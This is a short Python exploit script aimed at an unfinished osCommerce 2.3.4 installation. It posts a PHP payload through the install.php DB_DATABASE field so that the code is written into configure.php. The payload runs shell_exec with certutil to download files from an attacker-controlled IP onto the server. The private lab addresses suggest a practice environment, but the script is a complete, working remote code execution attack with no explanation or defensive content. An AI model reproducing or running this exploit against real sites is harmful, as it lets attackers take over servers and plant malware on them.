import os
import requests

# Attacker's IP and target information
attacker_ip = "10.9.4.113"
target_ip = "10.10.151.137"
malicious_dir = "Win32"  # Change this to your directory
base_url = f"http://{target_ip}:8080/oscommerce-2.3.4/catalog/"
target_url = f"http://{target_ip}:8080/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

# Payload to exploit the vulnerability
payload = '\');'
payload += f'$dir = "{malicious_dir}";'
payload += f'$files = scandir($dir);'
payload += f'foreach ($files as $file) {{'
payload += f'  if ($file != "." && $file != "..") {{'
payload += f'    $var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://{attacker_ip}/{malicious_dir}/$file $file");'
payload += f'    echo $var;'
payload += f'  }}'
payload += f'}}'
payload += '/*'

data['DB_DATABASE'] = payload

# Exploit execution
r = requests.post(url=target_url, data=data)

if r.status_code == 200:
    print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
else:
    print("[-] Exploit did not execute as planned")
